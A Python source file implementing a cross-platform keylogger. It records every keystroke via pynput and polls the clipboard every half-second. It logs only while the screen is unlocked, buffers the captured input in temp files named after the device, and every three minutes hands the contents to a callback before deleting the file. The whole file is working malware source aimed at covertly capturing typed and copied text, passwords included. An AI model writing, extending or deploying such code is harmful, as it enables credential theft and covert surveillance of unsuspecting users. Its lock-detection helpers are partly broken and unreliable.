"""
Cross-platform keylogging with lock detection and clipboard monitoring
"""
import platform
import logging
import threading
import time
from typing import Optional, Callable
from datetime import datetime
import tempfile
from pathlib import Path

logger = logging.getLogger(__name__)

# Try to import pynput (cross-platform keyboard library)
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False
    logger.warning("pynput not available - install with: pip install pynput")

# Try to import clipboard library
try:
    import pyperclip
    CLIPBOARD_AVAILABLE = True
except ImportError:
    CLIPBOARD_AVAILABLE = False
    logger.warning("pyperclip not available - install with: pip install pyperclip")

# Platform-specific imports for lock detection
if platform.system() == "Windows":
    try:
        import win32api
        import win32con
        WINDOWS_AVAILABLE = True
    except ImportError:
        WINDOWS_AVAILABLE = False
else:
    WINDOWS_AVAILABLE = False


def is_machine_locked() -> bool:
    """Check if the machine is locked (cross-platform)"""
    system = platform.system()
    
    if system == "Windows":
        if WINDOWS_AVAILABLE:
            try:
                # Check if screen saver is active or workstation is locked
                import win32api
                # This is a simple check - may need refinement
                # On Windows, detecting lock is complex - using screensaver as proxy
                import win32con
                return win32api.GetSystemMetrics(win32con.SM_CLEANBOOT) != 0
            except Exception:
                return False
        return False
    
    elif system == "Linux":
        # Check if screen is locked using loginctl
        try:
            import subprocess
            result = subprocess.run(
                ['loginctl', 'show-session', '$(loginctl | grep $(whoami) | awk \'{print $1}\')', '-p', 'LockedHint'],
                shell=True,
                capture_output=True,
                timeout=1
            )
            return 'yes' in result.stdout.decode().lower()
        except Exception:
            # Fallback: assume not locked if we can't check
            return False
    
    elif system == "Darwin":
        # macOS: Check screensaver/display sleep
        try:
            import subprocess
            result = subprocess.run(
                ['/usr/bin/pmset', '-g', 'ps'],
                capture_output=True,
                timeout=1
            )
            # Simple heuristic - may need refinement
            return False  # Assume not locked for now
        except Exception:
            return False
    
    return False


class KeyLogger:
    """Cross-platform keylogger with clipboard monitoring and buffering"""
    
    def __init__(self, callback: Optional[Callable[[str], None]] = None, device_name: str = "Unknown"):
        self.callback = callback
        self.running = False
        self.listener = None
        self.device_name = device_name
        
        # Buffering
        self.buffer = []
        self.last_key_time = time.time()
        self.inactivity_threshold = 30  # seconds
        
        # Modifier keys tracking
        self.ctrl_pressed = False
        self.shift_pressed = False
        self.alt_pressed = False
        
        # Key repeat tracking (for special keys only)
        self.last_special_key = None
        self.special_key_count = 0
        
        # Clipboard monitoring
        self.last_clipboard_content = None
        self.clipboard_monitor_thread = None
        self.clipboard_check_interval = 0.5  # Check every 500ms
        
        # RAM storage (temp directory)
        self.temp_dir = Path(tempfile.gettempdir()) / "keylog_buffer"
        self.temp_dir.mkdir(exist_ok=True)
        self.current_log_file = None
        self.create_new_log_file()
        
        # Send timer thread
        self.send_thread = None
        self.send_interval = 180  # 3 minutes
        
    def create_new_log_file(self):
        """Create a new log file with timestamp"""
        timestamp = datetime.now().strftime("%d.%m.%Y_%H.%M.%S")
        filename = f"{self.device_name}_{timestamp}.txt"
        self.current_log_file = self.temp_dir / filename
        logger.info(f"Created new keylog file: {self.current_log_file}")
        
    def write_to_buffer(self, text: str):
        """Write text to buffer file"""
        try:
            with open(self.current_log_file, 'a', encoding='utf-8') as f:
                f.write(text)
        except Exception as e:
            logger.error(f"Error writing to buffer: {e}")
    
    def flush_special_key_count(self):
        """Flush the special key count to buffer"""
        if self.last_special_key and self.special_key_count > 0:
            if self.special_key_count == 1:
                # Single press, just write the key
                self.write_to_buffer(self.last_special_key)
            else:
                # Multiple presses, write with count
                key_name = self.last_special_key.strip('[]')
                self.write_to_buffer(f"[{key_name} - {self.special_key_count}]")
            self.last_special_key = None
            self.special_key_count = 0
    
    def get_clipboard(self):
        """Get clipboard content"""
        if not CLIPBOARD_AVAILABLE:
            return None
        try:
            content = pyperclip.paste()
            return content if content else None
        except Exception as e:
            logger.debug(f"Error getting clipboard: {e}")
            return None
    
    def _on_press(self, key):
        """Handle key press event"""
        try:
            # Skip if machine is locked
            if is_machine_locked():
                return
            
            current_time = time.time()
            
            # Check for inactivity (30 seconds)
            if current_time - self.last_key_time > self.inactivity_threshold:
                self.flush_special_key_count()
                self.write_to_buffer("\n")
            
            self.last_key_time = current_time
            
            # Track modifier keys
            if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                self.ctrl_pressed = True
                return  # Don't log Ctrl
            elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                self.shift_pressed = True
                return  # Don't log Shift
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r or key == keyboard.Key.alt_gr:
                self.alt_pressed = True
                return
            
            # Skip ALL keys when Ctrl is pressed (Ctrl + any key combinations)
            if self.ctrl_pressed:
                self.flush_special_key_count()
                return
            
            # Handle Enter key
            if key == keyboard.Key.enter:
                self.flush_special_key_count()
                self.write_to_buffer("\n[Enter]\n")
                logger.debug("Enter key pressed - new line")
                return
            
            # Convert key to string
            is_special_key = False
            key_str = None
            
            try:
                # Regular character key
                key_str = key.char
                is_special_key = False
            except AttributeError:
                # Special key
                is_special_key = True
                if key == keyboard.Key.space:
                    key_str = " "
                    is_special_key = False  # Space is not counted as special
                elif key == keyboard.Key.tab:
                    key_str = "[Tab]"
                elif key == keyboard.Key.backspace:
                    key_str = "[BackSpace]"
                elif key == keyboard.Key.delete:
                    key_str = "[Delete]"
                elif key == keyboard.Key.caps_lock:
                    key_str = "[CapsLock]"
                elif key == keyboard.Key.esc:
                    key_str = "[Esc]"
                elif key == keyboard.Key.home:
                    key_str = "[Home]"
                elif key == keyboard.Key.end:
                    key_str = "[End]"
                elif key == keyboard.Key.page_up:
                    key_str = "[PageUp]"
                elif key == keyboard.Key.page_down:
                    key_str = "[PageDown]"
                elif key == keyboard.Key.up:
                    key_str = "[Up]"
                elif key == keyboard.Key.down:
                    key_str = "[Down]"
                elif key == keyboard.Key.left:
                    key_str = "[Left]"
                elif key == keyboard.Key.right:
                    key_str = "[Right]"
                else:
                    key_str = f"[{key.name.upper()}]"
            
            # Write to buffer
            if key_str:
                if is_special_key:
                    # Special key - count consecutive presses
                    if key_str == self.last_special_key:
                        self.special_key_count += 1
                    else:
                        # Different special key, flush previous
                        self.flush_special_key_count()
                        self.last_special_key = key_str
                        self.special_key_count = 1
                else:
                    # Regular character - flush any special key count first
                    self.flush_special_key_count()
                    self.write_to_buffer(key_str)
                
                logger.debug(f"Key logged: {key_str}")
                    
        except Exception as e:
            logger.error(f"Error processing key: {e}")
            import traceback
            logger.error(traceback.format_exc())
    
    def _on_release(self, key):
        """Handle key release event"""
        try:
            # Track modifier key releases
            if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                self.ctrl_pressed = False
            elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                self.shift_pressed = False
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r or key == keyboard.Key.alt_gr:
                self.alt_pressed = False
        except Exception as e:
            logger.error(f"Error processing key release: {e}")
    
    def _send_logs_periodically(self):
        """Send logs every 3 minutes"""
        while self.running:
            time.sleep(self.send_interval)
            if self.running:
                self._send_and_clear_logs()
    
    def _monitor_clipboard(self):
        """Continuously monitor clipboard for changes"""
        while self.running:
            try:
                if not is_machine_locked() and CLIPBOARD_AVAILABLE:
                    current_clipboard = self.get_clipboard()
                    
                    # Check if clipboard content changed
                    if current_clipboard and current_clipboard != self.last_clipboard_content:
                        # New content in clipboard
                        self.last_clipboard_content = current_clipboard
                        self.flush_special_key_count()
                        self.write_to_buffer(f"{{clipboard}} {current_clipboard}\n")
                        logger.debug(f"Clipboard changed: {len(current_clipboard)} chars")
                
                time.sleep(self.clipboard_check_interval)
            except Exception as e:
                logger.debug(f"Error monitoring clipboard: {e}")
                time.sleep(self.clipboard_check_interval)
    
    def _send_and_clear_logs(self):
        """Send current log file and create new one"""
        try:
            # Flush any pending special key count before sending
            self.flush_special_key_count()
            
            if self.current_log_file and self.current_log_file.exists():
                # Read log content
                with open(self.current_log_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                if content.strip():  # Only send if there's content
                    # Send via callback
                    if self.callback:
                        self.callback(content)
                    
                    logger.info(f"Sent log file: {self.current_log_file.name}")
                
                # Delete the file
                self.current_log_file.unlink()
                logger.info(f"Deleted log file: {self.current_log_file.name}")
                
                # Create new log file
                self.create_new_log_file()
                
        except Exception as e:
            logger.error(f"Error sending/clearing logs: {e}")
    
    def start(self):
        """Start keylogging"""
        if self.running:
            logger.warning("Keylogger already running")
            return
        
        if not PYNPUT_AVAILABLE:
            logger.error("Cannot start keylogger: pynput not available. Install with: pip install pynput")
            print("ERROR: Cannot start keylogger - pynput not installed")
            return
        
        self.running = True
        
        try:
            # Start keyboard listener
            self.listener = keyboard.Listener(
                on_press=self._on_press,
                on_release=self._on_release
            )
            self.listener.start()
            logger.info("Keylogger started successfully (using pynput)")
            print("Keylogger started successfully")
            
            # Start clipboard monitor thread
            if CLIPBOARD_AVAILABLE:
                self.clipboard_monitor_thread = threading.Thread(target=self._monitor_clipboard, daemon=True)
                self.clipboard_monitor_thread.start()
                logger.info("Clipboard monitor started")
                print("Clipboard monitor started")
            else:
                logger.warning("Clipboard monitoring disabled - pyperclip not available")
            
            # Start send timer thread
            self.send_thread = threading.Thread(target=self._send_logs_periodically, daemon=True)
            self.send_thread.start()
            logger.info("Keylog send timer started (3 minute interval)")
            
            # Check if listener is actually running
            if self.listener.is_alive():
                logger.info("Keylogger listener thread is alive")
            else:
                logger.error("Keylogger listener thread failed to start")
                
        except Exception as e:
            logger.error(f"Failed to start keylogger: {e}")
            print(f"ERROR starting keylogger: {e}")
            import traceback
            logger.error(traceback.format_exc())
            self.running = False
    
    def stop(self):
        """Stop keylogging"""
        self.running = False
        
        # Send any remaining logs before stopping
        self._send_and_clear_logs()
        
        if self.listener:
            try:
                self.listener.stop()
            except Exception as e:
                logger.error(f"Error stopping keylogger: {e}")
        
        # Clean up temp directory
        try:
            for file in self.temp_dir.glob("*.txt"):
                file.unlink()
            self.temp_dir.rmdir()
        except Exception as e:
            logger.debug(f"Error cleaning up temp directory: {e}")
        
        logger.info("Keylogger stopped")
